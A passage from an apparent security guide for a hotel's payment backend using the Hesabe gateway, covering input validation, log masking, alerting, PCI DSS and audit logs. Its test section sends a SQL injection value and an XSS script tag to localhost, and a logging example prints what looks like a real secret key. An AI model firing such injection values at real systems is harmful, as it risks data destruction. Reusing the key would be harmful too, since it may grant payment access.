│  └─ CORS checks                                          │
│                                                          │
│  Layer 3: Input Validation (Express Middleware)          │
│  ├─ Schema validation                                    │
│  ├─ Type checking                                        │
│  ├─ Range validation                                     │
│  └─ Format validation                                    │
│                                                          │
│  Layer 4: Input Sanitization                             │
│  ├─ HTML escaping                                        │
│  ├─ SQL/NoSQL injection prevention                       │
│  ├─ XSS prevention                                       │
│  └─ Control character removal                            │
│                                                          │
│  Layer 5: Business Logic Validation                      │
│  ├─ Check room exists                                    │
│  ├─ Verify order total                                   │
│  └─ Validate against business rules                      │
│                                                          │
│  Layer 6: Database Security (Firebase)                   │
│  ├─ Security rules                                       │
│  ├─ Data encryption                                      │
│  └─ Access control                                       │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---

### 📋 Complete Validation Example

**Full implementation for `/payment/checkout`**:

```javascript
const express = require("express");
const { body, validationResult } = require("express-validator");
const router = express.Router();

// Validation rules
const checkoutValidation = [
  // Amount validation
  body("amount")
    .notEmpty()
    .withMessage("Amount is required")
    .isFloat({ min: 0.2, max: 9999.999 })
    .withMessage("Amount must be between 0.200 and 9999.999 KWD")
    .toFloat(),

  // Order reference validation
  body("orderReferenceNumber")
    .notEmpty()
    .withMessage("Order reference is required")
    .matches(/^ORDER-[0-9]{13}$/)
    .withMessage("Invalid order reference format"),

  // Room number (variable1)
  body("variable1")
    .optional()
    .trim()
    .isLength({ max: 10 })
    .matches(/^[A-Z0-9]+$/i)
    .withMessage("Room number can only contain letters and numbers")
    .escape(),

  // Phone number (variable2)
  body("variable2")
    .optional()
    .trim()
    .matches(/^\+?[0-9]{8,15}$/)
    .withMessage("Invalid phone number")
    .escape(),

  // Guest name (variable3)
  body("variable3")
    .optional()
    .trim()
    .isLength({ max: 50 })
    .matches(/^[a-zA-Z\s\-']+$/)
    .withMessage("Name contains invalid characters")
    .escape(),

  // Chair number (variable4)
  body("variable4")
    .optional()
    .trim()
    .isLength({ max: 10 })
    .matches(/^[A-Z0-9\-]+$/i)
    .escape(),

  // Menu type (variable5)
  body("variable5")
    .optional()
    .isIn(["presto", "room-service"])
    .withMessage("Invalid menu type"),
];

// Route with validation
router.post("/payment/checkout", checkoutValidation, async (req, res) => {
  try {
    // Check validation results
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      console.error("Validation errors:", errors.array());
      return res.status(400).json({
        success: false,
        error: "Validation failed",
        details: errors.array(),
      });
    }

    // Extract validated data
    const {
      amount,
      orderReferenceNumber,
      variable1,
      variable2,
      variable3,
      variable4,
      variable5,
    } = req.body;

    // Additional business logic validation
    if (amount <= 0) {
      return res.status(400).json({
        success: false,
        error: "Amount must be greater than zero",
      });
    }

    // Proceed with Hesabe checkout
    const checkoutData = await hesabeService.createCheckout({
      amount: amount.toFixed(3),
      orderReferenceNumber,
      variable1,
      variable2,
      variable3,
      variable4,
      variable5,
    });

    res.json({
      success: true,
      redirectUrl: checkoutData.redirectUrl,
    });
  } catch (error) {
    console.error("Checkout error:", error);
    res.status(500).json({
      success: false,
      error: "Checkout failed",
    });
  }
});

module.exports = router;
```

---

### 🎯 Implementation Priority

| Validation Type         | Priority        | When          | Effort  |
| ----------------------- | --------------- | ------------- | ------- |
| Amount validation       | ⚠️ **CRITICAL** | Implement now | 30 min  |
| Room/phone sanitization | ⚠️ **HIGH**     | Before prod   | 1 hour  |
| Schema validation       | 💡 **MEDIUM**   | Post-launch   | 2 hours |
| Advanced sanitization   | 🔹 **LOW**      | If needed     | 3 hours |

**Dependencies to Install**:

```bash
cd seashell-backend
npm install express-validator validator
```

---

### ✅ Validation Checklist

**Before Production**:

- [ ] Install `express-validator`
- [ ] Add amount validation (min/max/decimals)
- [ ] Add room number format validation
- [ ] Add phone number format validation
- [ ] Sanitize all text inputs (escape HTML)
- [ ] Whitelist payment method values
- [ ] Reject unexpected fields
- [ ] Test with malicious inputs
- [ ] Handle validation errors gracefully
- [ ] Log validation failures

**Testing Malicious Inputs**:

```bash
# Test with negative amount
curl -X POST http://localhost:4000/payment/checkout \
  -H "Content-Type: application/json" \
  -d '{"amount": -10.500}'

# Test with SQL injection
curl -X POST http://localhost:4000/payment/checkout \
  -H "Content-Type: application/json" \
  -d '{"amount": 10.500, "variable1": "101'; DROP TABLE--"}'

# Test with XSS attempt
curl -X POST http://localhost:4000/payment/checkout \
  -H "Content-Type: application/json" \
  -d '{"amount": 10.500, "variable3": "<script>alert('xss')</script>"}'

# Test with excessive decimals
curl -X POST http://localhost:4000/payment/checkout \
  -H "Content-Type: application/json" \
  -d '{"amount": 10.123456789}'
```

---

## 5. Error Handling & Logging

### 🔒 No Sensitive Data in Logs

**What it is**: Prevent sensitive payment data from appearing in logs or error messages.

| Data Type         | Logging Status   | Recommendation            |
| ----------------- | ---------------- | ------------------------- |
| Card numbers      | ❌ **NEVER LOG** | N/A (not stored)          |
| CVV/CVC           | ❌ **NEVER LOG** | N/A (not stored)          |
| Payment tokens    | ⚠️ **MASK**      | Show last 4 chars only    |
| Hesabe secret key | ❌ **NEVER LOG** | Redact completely         |
| Room numbers      | ✅ **SAFE**      | Can log (low sensitivity) |
| Phone numbers     | ⚠️ **MASK**      | Show last 4 digits        |
| Amounts           | ✅ **SAFE**      | Can log                   |
| Transaction IDs   | ✅ **SAFE**      | Can log (reference only)  |

**Priority**: ⚠️ **CRITICAL** - Implement before production

---

### 🎭 Data Masking Implementation

**Current Problem** (Needs Fixing):

```javascript
// ❌ BAD - Logs sensitive data
console.log("Payment request:", req.body);
// Output: { amount: 10.500, phoneNumber: "96595959595", ... }

console.log("Hesabe response:", hesabeResponse);
// Output: { secretKey: "PkW64zMe5NVdrlPVNnjo2Jy9nOb7v1Xg", ... }
```

**Secure Implementation**:

```javascript
// Data masking utility functions
const maskSensitiveData = {
  // Mask phone number: +96595959595 → +965***9595
  phoneNumber: (phone) => {
    if (!phone || phone.length < 4) return "****";
    return phone.slice(0, -4).replace(/./g, "*") + phone.slice(-4);
  },

  // Mask payment token: 84221717... → 8422****
  paymentToken: (token) => {
    if (!token || token.length < 8) return "****";
    return token.slice(0, 4) + "****";
  },

  // Mask card number (if ever received): 4111111111111111 → 4111****1111
  cardNumber: (card) => {
    if (!card || card.length < 8) return "****";
    return card.slice(0, 4) + "****" + card.slice(-4);
  },

  // Completely redact secrets
  secret: () => "[REDACTED]",

  // Mask full object
  request: (data) => {
    const masked = { ...data };

    if (masked.variable2) {
      // Phone number
      masked.variable2 = maskSensitiveData.phoneNumber(masked.variable2);
    }

    if (masked.paymentToken) {
      masked.paymentToken = maskSensitiveData.paymentToken(masked.paymentToken);
    }

    // Remove any secret keys
    delete masked.secretKey;
    delete masked.HESABE_SECRET_KEY;

    return masked;
  },
};

// Secure logging
console.log("Payment request:", maskSensitiveData.request(req.body));
// Output: { amount: 10.500, variable2: "+965***9595", ... }
```

---

### 📋 Structured Logging with Correlation IDs

**What it is**: Use correlation IDs to track transactions across services and logs.

**Benefits**:

- ✅ Track payment from initiation to completion
- ✅ Debug issues faster
- ✅ Correlate frontend/backend logs
- ✅ Audit trail for compliance

**Implementation**:

```javascript
const { v4: uuidv4 } = require("uuid");

// Middleware to add correlation ID
app.use((req, res, next) => {
  // Use existing correlation ID or create new one
  const correlationId = req.headers["x-correlation-id"] || uuidv4();

  // Attach to request object
  req.correlationId = correlationId;

  // Return in response headers
  res.setHeader("X-Correlation-ID", correlationId);

  // Add to all logs from this request
  req.log = (level, message, data = {}) => {
    console.log(
      JSON.stringify({
        timestamp: new Date().toISOString(),
        correlationId,
        level,
        message,
        ...data,
      }),
    );
  };

  next();
});

// Usage in routes
router.post("/payment/checkout", async (req, res) => {
  req.log("info", "Payment checkout initiated", {
    orderRef: req.body.orderReferenceNumber,
    amount: req.body.amount,
    roomNumber: req.body.variable1,
  });

  try {
    const result = await hesabeService.createCheckout(req.body);

    req.log("info", "Hesabe checkout created", {
      hesabePaymentId: result.paymentId,
      status: "success",
    });

    res.json({ success: true, redirectUrl: result.redirectUrl });
  } catch (error) {
    req.log("error", "Checkout failed", {
      error: error.message,
      stack: process.env.NODE_ENV === "development" ? error.stack : undefined,
    });

    res.status(500).json({ success: false, error: "Checkout failed" });
  }
});
```

**Log Output** (Structured JSON):

```json
{
  "timestamp": "2026-02-01T20:48:00.000Z",
  "correlationId": "550e8400-e29b-41d4-a716-446655440000",
  "level": "info",
  "message": "Payment checkout initiated",
  "orderRef": "ORDER-1769893731943",
  "amount": 0.5,
  "roomNumber": "101"
}
```

---

### 🔍 Logging Levels & What to Log

**Logging Strategy**:

| Level     | When to Use         | Examples                           |
| --------- | ------------------- | ---------------------------------- |
| **ERROR** | Critical failures   | Payment API down, database errors  |
| **WARN**  | Recoverable issues  | Rate limit hit, validation failed  |
| **INFO**  | Normal operations   | Payment initiated, order completed |
| **DEBUG** | Development details | Request/response details           |

**What to Log for Payments**:

```javascript
// Payment Initiation
req.log("info", "Payment checkout initiated", {
  correlationId: req.correlationId,
  orderRef: orderReferenceNumber,
  amount: amount,
  roomNumber: roomNumber, // Not sensitive
  phoneNumber: maskSensitiveData.phoneNumber(phoneNumber),
  menu: menuType,
  timestamp: new Date().toISOString(),
  ip: req.ip,
  userAgent: req.get("user-agent"),
});

// Payment Success
req.log("info", "Payment successful", {
  correlationId: req.correlationId,
  orderRef: orderReferenceNumber,
  hesabePaymentId: result.paymentId,
  hesabeTransactionId: result.transactionId,
  amount: result.amount,
  currency: result.currency,
  timestamp: new Date().toISOString(),
});

// Payment Failure
req.log("warn", "Payment failed", {
  correlationId: req.correlationId,
  orderRef: orderReferenceNumber,
  reason: result.message,
  errorCode: result.code,
  timestamp: new Date().toISOString(),
});

// Suspicious Activity
req.log("warn", "Suspicious payment attempt detected", {
  correlationId: req.correlationId,
  reason: "Multiple failed attempts",
  ip: req.ip,
  attempts: 5,
  timestamp: new Date().toISOString(),
});
```

---

### 📊 Logging Libraries (Production Ready)

**Option 1: Winston** (Recommended)

```javascript
const winston = require("winston");

// Create logger
const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || "info",
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json(),
  ),
  defaultMeta: { service: "seashell-payment" },
  transports: [
    // Write errors to error.log
    new winston.transports.File({
      filename: "error.log",
      level: "error",
    }),
    // Write all logs to combined.log
    new winston.transports.File({
      filename: "combined.log",
    }),
  ],
});

// Console logging for development
if (process.env.NODE_ENV !== "production") {
  logger.add(
    new winston.transports.Console({
      format: winston.format.simple(),
    }),
  );
}

// Usage
logger.info("Payment initiated", {
  correlationId: req.correlationId,
  amount: 10.5,
});

logger.error("Payment failed", {
  correlationId: req.correlationId,
  error: error.message,
});
```

**Cost**: Free
**Installation**: `npm install winston`

---

**Option 2: Pino** (Fastest)

```javascript
const pino = require("pino");

const logger = pino({
  level: process.env.LOG_LEVEL || "info",
  formatters: {
    level: (label) => {
      return { level: label };
    },
  },
  redact: {
    paths: ["password", "creditCard", "cvv", "secretKey"],
    remove: true,
  },
});

// Usage
logger.info(
  {
    correlationId: req.correlationId,
    orderRef: "ORDER-123",
    amount: 10.5,
  },
  "Payment initiated",
);
```

**Cost**: Free
**Installation**: `npm install pino`
**Why**: 5x faster than Winston

---

### 🚨 Real-Time Alerting for Failed/Suspicious Transactions

**What to Monitor**:

| Event                      | Threshold              | Action               |
| -------------------------- | ---------------------- | -------------------- |
| Payment failures           | 3+ in 15 min           | Alert manager        |
| Same IP, multiple failures | 5+ attempts            | Block IP temporarily |
| Unusually large amount     | > 100 KWD              | Manual review        |
| Callback not received      | > 10 min after payment | Alert tech team      |
| Server errors              | Any 500 error          | Immediate alert      |

---

### 📧 Alerting Implementation

**Option 1: Email Alerts** (Simple)

```javascript
const nodemailer = require("nodemailer");

// Configure email transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.ALERT_EMAIL,
    pass: process.env.ALERT_EMAIL_PASSWORD,
  },
});

// Alert function
const sendAlert = async (severity, title, details) => {
  const mailOptions = {
    from: process.env.ALERT_EMAIL,
    to: process.env.MANAGER_EMAIL,
    subject: `[${severity.toUpperCase()}] Seashell Payment Alert: ${title}`,
    html: `
      <h2>Payment System Alert</h2>
      <p><strong>Severity:</strong> ${severity}</p>
      <p><strong>Time:</strong> ${new Date().toISOString()}</p>
      <p><strong>Details:</strong></p>
      <pre>${JSON.stringify(details, null, 2)}</pre>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    logger.info("Alert email sent", { severity, title });
  } catch (error) {
    logger.error("Failed to send alert email", { error: error.message });
  }
};

// Usage
if (failedAttempts >= 3) {
  await sendAlert("HIGH", "Multiple Payment Failures", {
    ip: req.ip,
    attempts: failedAttempts,
    roomNumber: roomNumber,
    timestamp: new Date().toISOString(),
  });
}
```

**Cost**: Free (using Gmail)

---

**Option 2: Slack Notifications** (Team Collaboration)

```javascript
const { WebClient } = require("@slack/web-api");

const slack = new WebClient(process.env.SLACK_BOT_TOKEN);

const sendSlackAlert = async (severity, message, details) => {
  const color = {
    LOW: "#36a64f", // Green
    MEDIUM: "#ff9800", // Orange
    HIGH: "#f44336", // Red
    CRITICAL: "#9c27b0", // Purple
  }[severity];

  try {
    await slack.chat.postMessage({
      channel: "#payment-alerts",
      text: `Payment Alert: ${message}`,
      attachments: [
        {
          color,
          fields: [
            { title: "Severity", value: severity, short: true },
            { title: "Time", value: new Date().toISOString(), short: true },
            {
              title: "Details",
              value: `\`\`\`${JSON.stringify(details, null, 2)}\`\`\``,
            },
          ],
        },
      ],
    });
  } catch (error) {
    logger.error("Failed to send Slack alert", { error: error.message });
  }
};

// Usage
await sendSlackAlert("HIGH", "Payment gateway timeout", {
  orderRef: "ORDER-123",
  hesabeStatus: "timeout",
});
```

**Cost**: Free (Slack free tier)
**Installation**: `npm install @slack/web-api`

---

**Option 3: Firebase Cloud Messaging** (Push Notifications)

```javascript
const admin = require("firebase-admin");

const sendPushAlert = async (title, body, data) => {
  const message = {
    notification: {
      title,
      body,
    },
    data,
    topic: "payment-alerts", // Manager's device subscribed to this topic
  };

  try {
    await admin.messaging().send(message);
    logger.info("Push notification sent", { title });
  } catch (error) {
    logger.error("Failed to send push notification", { error: error.message });
  }
};

// Usage
await sendPushAlert(
  "Payment System Alert",
  "Multiple payment failures detected",
  { severity: "HIGH", count: "5" },
);
```

**Cost**: Free

---

### 🔔 Monitoring Dashboard (Optional but Recommended)

**Free Options**:

1. **Firebase Analytics** (Already have Firebase)
   - Track payment events
   - View success/failure rates
   - Real-time monitoring

2. **Grafana + Loki** (Self-hosted)
   - Parse JSON logs
   - Create dashboards
   - Set up alerts

3. **Datadog** (Free tier: 5 hosts)
   - APM monitoring
   - Log aggregation
   - Alerting

**Paid Options**:

1. **Sentry** ($26/month)
   - Error tracking
   - Performance monitoring
   - Release tracking

2. **LogRocket** ($99/month)
   - Session replay
   - Error tracking
   - Performance monitoring

---

### 📈 Log Retention & Storage

**Recommendations**:

| Log Type     | Retention | Storage     | Why                  |
| ------------ | --------- | ----------- | -------------------- |
| Payment logs | 7 years   | Database/S3 | Financial compliance |
| Error logs   | 1 year    | File system | Debugging            |
| Debug logs   | 30 days   | File system | Development only     |
| Access logs  | 90 days   | File system | Security audit       |

**Implementation**:

```javascript
// Log rotation with Winston
const winston = require("winston");
require("winston-daily-rotate-file");

const transport = new winston.transports.DailyRotateFile({
  filename: "payment-%DATE%.log",
  datePattern: "YYYY-MM-DD",
  maxSize: "20m",
  maxFiles: "7y", // Keep for 7 years
  compress: true, // Gzip old logs
});

const logger = winston.createLogger({
  transports: [transport],
});
```

---

### ✅ Error Handling & Logging Checklist

**Implementation Checklist**:

- [ ] Install logging library (Winston/Pino)
- [ ] Add correlation ID middleware
- [ ] Implement data masking functions
- [ ] Never log sensitive data (secrets, cards, CVVs)
- [ ] Mask phone numbers and tokens
- [ ] Use structured JSON logging
- [ ] Set up log rotation
- [ ] Configure log retention (7 years for payments)
- [ ] Set up email/Slack alerts for critical errors
- [ ] Monitor failed payment attempts
- [ ] Alert on suspicious activity
- [ ] Test alerting system

**Testing**:

```bash
# Test logging
npm install winston uuid
node -e "console.log(require('winston').createLogger().info('test'))"

# Test email alerts
# (Add test function and run)

# Test with failed payment
curl -X POST http://localhost:4000/payment/checkout \
  -H "Content-Type: application/json" \
  -d '{"amount": -10.500}' # Should log validation error
```

---

### 🎯 Priority Matrix

| Feature                      | Priority        | When               | Effort    | Cost      |
| ---------------------------- | --------------- | ------------------ | --------- | --------- |
| Data masking                 | ⚠️ **CRITICAL** | Before prod        | 1 hour    | Free      |
| Correlation IDs              | ⚠️ **HIGH**     | Before prod        | 30 min    | Free      |
| Structured logging (Winston) | ⚠️ **HIGH**     | Before prod        | 1 hour    | Free      |
| Email alerts                 | 💡 **MEDIUM**   | Post-launch        | 2 hours   | Free      |
| Slack notifications          | 🔹 **OPTIONAL** | If team uses Slack | 1 hour    | Free      |
| Monitoring dashboard         | 🔹 **OPTIONAL** | Post-launch        | 3-5 hours | $0-$26/mo |

---

## 6. Compliance & Standards

### 💳 PCI DSS Alignment

**What it is**: Payment Card Industry Data Security Standard - rules for handling payment card data.

| PCI DSS Requirement              | Your Status          | How You Comply               |
| -------------------------------- | -------------------- | ---------------------------- |
| **Don't store card data**        | ✅ **COMPLIANT**     | Hesabe handles all card data |
| **Don't store CVV**              | ✅ **COMPLIANT**     | Never receive CVV            |
| **Encrypt card data in transit** | ✅ **COMPLIANT**     | HTTPS to Hesabe API          |
| **Maintain secure network**      | ⚠️ **PARTIAL**       | Add firewall + HTTPS         |
| **Protect stored data**          | ✅ **COMPLIANT**     | No card data stored          |
| **Restrict access**              | ⚠️ **PARTIAL**       | Add RBAC for management      |
| **Monitor and test networks**    | ⚠️ **NEEDS WORK**    | Add logging + monitoring     |
| **Maintain security policy**     | ✅ **THIS DOCUMENT** | Security recommendations     |

**Your PCI DSS Level**: **SAQ-A** (Self-Assessment Questionnaire A)

---

### 📊 PCI DSS SAQ-A Requirements

**What is SAQ-A?**

- Simplest PCI compliance level
- For merchants who outsource ALL card processing
- **No annual audit required** (vs. $20k-$50k for full audit)
- Self-assessment questionnaire only

**SAQ-A Eligibility Criteria** (You Meet All ✅):

| Criteria                 | Your Status   | Notes                        |
| ------------------------ | ------------- | ---------------------------- |
| All card data outsourced | ✅ **YES**    | Hesabe handles everything    |
| No card data storage     | ✅ **YES**    | Only store transaction IDs   |
| No card data processing  | ✅ **YES**    | Redirect to Hesabe           |
| HTTPS for payment page   | ✅ **YES**    | Hesabe payment page is HTTPS |
| Annual PCI scan          | ⚠️ **NEEDED** | Use free scanners            |

---

### ✅ PCI DSS Compliance Checklist

**Already Compliant**:

- ✅ Never store card numbers, CVV, expiry dates
- ✅ Use PCI-compliant payment provider (Hesabe)
- ✅ Encrypt payment data in transit (HTTPS)
- ✅ No direct card data entry in your app
- ✅ Secure callback URLs

**Need to Implement (Production)**:

- [ ] HTTPS for all pages (automatic with hosting)
- [ ] Regular security scans (quarterly)
- [ ] Staff security training (annual)
- [ ] Incident response plan
- [ ] Access control for management app

**Documentation Required**:

- [ ] This security policy document ✅ (you're creating it now!)
- [ ] Hesabe service agreement
- [ ] Network diagram
- [ ] Data flow documentation
- [ ] SAQ-A questionnaire (annual)

---

### 🛡️ Free PCI Compliance Tools

**Vulnerability Scanners** (Free):

1. **Qualys SSL Labs**
   - URL: https://www.ssllabs.com/ssltest/
   - Tests: SSL/TLS configuration
   - Cost: Free

2. **Mozilla Observatory**
   - URL: https://observatory.mozilla.org/
   - Tests: Security headers, TLS, etc.
   - Cost: Free

3. **SecurityHeaders.com**
   - URL: https://securityheaders.com/
   - Tests: HTTP security headers
   - Cost: Free

**Usage**:

```bash
# Run quarterly scans
1. Go to https://www.ssllabs.com/ssltest/
2. Enter your production URL
3. Save report (required for PCI compliance)
4. Fix any issues found
```

---

### 🌍 GDPR & Local Data Protection Laws

**Applicable Laws for Your Hotel in Kuwait**:

| Law                                    | Applicability   | Requirements                |
| -------------------------------------- | --------------- | --------------------------- |
| **Kuwait Data Protection Law** (Draft) | ✅ **YES**      | Protect guest data, consent |
| **GDPR** (if EU guests)                | ⚠️ **MAYBE**    | EU guest data protection    |
| **GCC Data Protection**                | ⚠️ **EMERGING** | Regional standards          |

---

### 👤 Personal Identifiable Information (PII) You Collect

**PII Data Inventory**:

| Data Type          | Sensitivity | Storage       | Retention | Purpose                  |
| ------------------ | ----------- | ------------- | --------- | ------------------------ |
| **Room number**    | MEDIUM      | Firebase      | 90 days   | Order delivery           |
| **Phone number**   | HIGH        | Firebase      | 90 days   | Guest contact            |
| **Guest name**     | MEDIUM      | Firebase      | 90 days   | Order confirmation       |
| **Order items**    | LOW         | Firebase      | 90 days   | Food service             |
| **Payment amount** | MEDIUM      | Firebase/Logs | 7 years   | Financial records        |
| **Transaction ID** | LOW         | Firebase/Logs | 7 years   | Dispute resolution       |
| **IP address**     | MEDIUM      | Logs          | 30 days   | Security/fraud detection |
| **Device info**    | LOW         | Logs          | 30 days   | Tech support             |

**What You DON'T Collect** (Good!):

- ❌ National ID/Passport numbers
- ❌ Home addresses
- ❌ Email addresses (unless for receipt)
- ❌ Credit card numbers
- ❌ Biometric data

---

### 🔒 GDPR/Data Protection Compliance

**Required Actions**:

#### **1. Guest Consent**

**Current Status**: ⚠️ Needs implementation

**Implementation**:

```typescript
// Add to menu app - consent before checkout
const GuestConsentBanner = () => {
  const [accepted, setAccepted] = useState(false);

  return (
    <div className="consent-banner">
      <p>
        We collect your room number, phone number, and order details
        to process and deliver your order. Data is retained for 90 days.
        By proceeding, you consent to our data handling practices.
      </p>
      <a href="/privacy-policy">View Privacy Policy</a>
      <button onClick={() => setAccepted(true)}>
        I Accept
      </button>
    </div>
  );
};
```

**Priority**: ⚠️ **HIGH** - Required before launch

---

#### **2. Privacy Policy**

**Required Content**:

- What data you collect (room number, phone, name)
- Why you collect it (order fulfillment)
- How long you keep it (90 days for orders, 7 years for transactions)
- Who has access (hotel staff only)
- Guest rights (access, deletion, correction)
- How to contact you

**Template**:

```markdown
# Seashell F&B Privacy Policy

## Data We Collect

- Room number (for delivery)
- Phone number (for contact)
- Guest name (for confirmation)
- Order details (food items, amounts)

## Why We Collect It

To process and deliver your food orders.

## Data Retention

- Order details: 90 days
- Payment records: 7 years (financial compliance)

## Your Rights

- View your data
- Request deletion (after delivery)
- Opt out of future orders

## Contact

privacy@yourhotel.com
```

**Priority**: ⚠️ **HIGH** - Required by law

---

#### **3. Data Subject Rights**

**Guest Rights Under GDPR**:

| Right                    | Description        | Implementation           |
| ------------------------ | ------------------ | ------------------------ |
| **Right to Access**      | View their data    | Admin panel query        |
| **Right to Deletion**    | Delete their data  | Manual process           |
| **Right to Correction**  | Fix incorrect data | Contact front desk       |
| **Right to Portability** | Export their data  | JSON export              |
| **Right to Object**      | Opt out            | Don't save optional data |

**Implementation** (Management App):

```javascript
// Add to management app
const deleteGuestData = async (phoneNumber) => {
  // Get user confirmation
  if (!confirm("Delete all data for this guest?")) return;

  // Delete orders
  const ordersRef = firestore.collection("orders");
  const snapshot = await ordersRef
    .where("phoneNumber", "==", phoneNumber)
    .get();

  const batch = firestore.batch();
  snapshot.docs.forEach((doc) => {
    batch.delete(doc.ref);
  });

  await batch.commit();

  // Log deletion for audit trail
  await firestore.collection("audit_log").add({
    action: "data_deletion",
    phoneNumber: maskPhoneNumber(phoneNumber),
    timestamp: new Date(),
    reason: "Guest request",
  });
};
```

**Priority**: 💡 **MEDIUM** - Implement post-launch

---

#### **4. Data Breach Notification**

**Legal Requirement**: Notify within 72 hours of data breach

**Implementation Plan**:

```javascript
// Breach detection & notification
const handleDataBreach = async (breachDetails) => {
  // 1. Log the breach
  await firestore.collection("security_incidents").add({
    type: "data_breach",
    timestamp: new Date(),
    details: breachDetails,
    status: "investigating",
  });

  // 2. Alert management immediately
  await sendAlert("CRITICAL", "Data Breach Detected", {
    affectedRecords: breachDetails.count,
    dataTypes: breachDetails.types,
    timestamp: new Date(),
  });

  // 3. Start 72-hour clock
  // Manual process:
  // - Investigate scope
  // - Notify authorities (if required)
  // - Notify affected guests
  // - Document response
};
```

**Priority**: ⚠️ **HIGH** - Have plan ready

---

### 📋 Audit Trails (Immutable Transaction Logs)

**What it is**: Permanent, tamper-proof logs for dispute resolution and compliance.

**Why Critical**:

- ✅ Resolve payment disputes
- ✅ Prove transaction history
- ✅ Meet financial regulations
- ✅ PCI DSS requirement
- ✅ Legal evidence

---

### 🔐 Immutable Audit Log Implementation

**Requirements**:

1. **Cannot be modified** once written
2. **Cannot be deleted** (within retention period)
3. **Timestamped** with server time
4. **Includes all transaction details**
5. **Stored securely** (separate from application DB)

**Implementation with Firebase**:

```javascript
// Dedicated audit log collection
const createAuditLog = async (eventType, data) => {
  const auditLog = {
    // Unique ID
    auditId: `AUDIT-${Date.now()}-${uuid()}`,

    // Event details
    eventType, // 'payment_initiated', 'payment_success', 'payment_failed'
    timestamp: admin.firestore.FieldValue.serverTimestamp(),

    // Transaction data
    orderReference: data.orderReference,
    amount: data.amount,
    currency: "KWD",
    paymentMethod: "card",

    // Hesabe data
    hesabePaymentId: data.hesabePaymentId,
    hesabeTransactionId: data.hesabeTransactionId,
    hesabeStatus: data.status,

    // Guest data (minimal PII)
    roomNumber: data.roomNumber,
    phoneNumberHash: hashPhoneNumber(data.phoneNumber), // Hash, don't store plain

    // Technical details
    ipAddress: data.ip,
    userAgent: data.userAgent,
    correlationId: data.correlationId,

    // Status
    success: data.success,
    errorMessage: data.error || null,

    // Immutability marker
    immutable: true,
    retentionYears: 7,
  };

  // Write to audit log collection
  await firestore.collection("audit_logs").add(auditLog);

  // Also write to cold storage (S3/Cloud Storage) for long-term retention
  if (process.env.NODE_ENV === "production") {
    await archiveToCloudStorage(auditLog);
  }
};

// Usage
await createAuditLog("payment_success", {
  orderReference: "ORDER-1234",
  amount: 10.5,
  hesabePaymentId: "100603220000000030",
  hesabeTransactionId: "603220000011065",
  roomNumber: "101",
  phoneNumber: "+96595959595",
  ip: req.ip,
  userAgent: req.get("user-agent"),
  correlationId: req.correlationId,
  success: true,
});
```

---

### 🔒 Protect Audit Logs from Modification

**Firestore Security Rules**:

```javascript
// firestore.rules
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    // Audit logs - Write once, read by admins only
    match /audit_logs/{logId} {
      // Only backend can write (via Admin SDK)
      allow write: if false;

      // Only admins can read
      allow read: if request.auth != null
        && request.auth.token.role == 'admin';
    }

    // Regular orders - can be updated
    match /orders/{orderId} {
      allow read, write: if request.auth != null
        && request.auth.token.role in ['staff', 'admin'];
    }
  }
}
```

**Backend-Only Writes**:

```javascript
// Only backend (Admin SDK) can write audit logs
// Frontend cannot write or modify
const admin = require("firebase-admin");
const firestore = admin.firestore();

// This bypasses security rules (admin privilege)
await firestore.collection("audit_logs").add(auditLog);
```

---

### 📊 Audit Log Retention & Storage

**Storage Strategy**:

| Period               | Storage          | Access     | Cost             |
| -------------------- | ---------------- | ---------- | ---------------- |
| **0-90 days**        | Firestore        | Fast query | ~$1/GB/month     |
| **90 days - 1 year** | Cloud Storage    | Archive    | ~$0.02/GB/month  |
| **1-7 years**        | Glacier/Coldline | Compliance | ~$0.004/GB/month |

**Implementation**:

```javascript
// Monthly job to archive old logs
const archiveOldAuditLogs = async () => {
  const ninetyDaysAgo = new Date();
  ninetyDaysAgo.setDate(ninetyDaysAgo.getDate() - 90);

  const oldLogs = await firestore
    .collection("audit_logs")
    .where("timestamp", "<", ninetyDaysAgo)
    .get();

  if (oldLogs.empty) {
    console.log("No logs to archive");
    return;
  }

  // Archive to Cloud Storage
  const archiveData = oldLogs.docs.map((doc) => doc.data());
  const fileName = `audit-logs-${new Date().toISOString()}.json`;

  await bucket
    .file(`archives/audit-logs/${fileName}`)
    .save(JSON.stringify(archiveData, null, 2));

  console.log(`Archived ${oldLogs.size} logs to ${fileName}`);

  // Optional: Delete from Firestore (keep in Cloud Storage)
  // Only if storage costs are a concern
};

// Run monthly via Cloud Scheduler
```

---

### 🔍 Querying Audit Logs (Dispute Resolution)

**Common Queries**:

```javascript
// 1. Find all transactions for an order
const getOrderAuditTrail = async (orderReference) => {
  const logs = await firestore
    .collection("audit_logs")
    .where("orderReference", "==", orderReference)
    .orderBy("timestamp", "asc")
    .get();

  return logs.docs.map((doc) => doc.data());
};

// 2. Find all transactions for a guest (by room)
const getGuestTransactions = async (roomNumber, startDate, endDate) => {
  const logs = await firestore
    .collection("audit_logs")
    .where("roomNumber", "==", roomNumber)
    .where("timestamp", ">=", startDate)
    .where("timestamp", "<=", endDate)
    .get();

  return logs.docs.map((doc) => doc.data());
};

// 3. Find failed payments
const getFailedPayments = async (last24Hours = true) => {
  const oneDayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);

  let query = firestore
    .collection("audit_logs")
    .where("success", "==", false)
    .where("eventType", "==", "payment_failed");

  if (last24Hours) {
    query = query.where("timestamp", ">=", oneDayAgo);
  }

  const logs = await query.get();
  return logs.docs.map((doc) => doc.data());
};

// 4. Export for legal/dispute
const exportAuditLogs = async (orderReference) => {
  const logs = await getOrderAuditTrail(orderReference);

  // Create PDF or CSV for legal team
  const exportData = logs.map((log) => ({
    Date: log.timestamp.toDate().toISOString(),
    Event: log.eventType,
    Amount: `${log.amount} ${log.currency}`,
    Status: log.success ? "Success" : "Failed",
    HesabeID: log.hesabePaymentId,
    TransactionID: log.hesabeTransactionId,
    Room: log.roomNumber,
  }));

  return exportData;
};
```

---

### ✅ Compliance & Audit Checklist

**PCI DSS**:

- [ ] Complete SAQ-A questionnaire (annual)
- [ ] Run quarterly vulnerability scans
- [ ] Document network architecture
- [ ] Staff training on card data handling
- [ ] Incident response plan
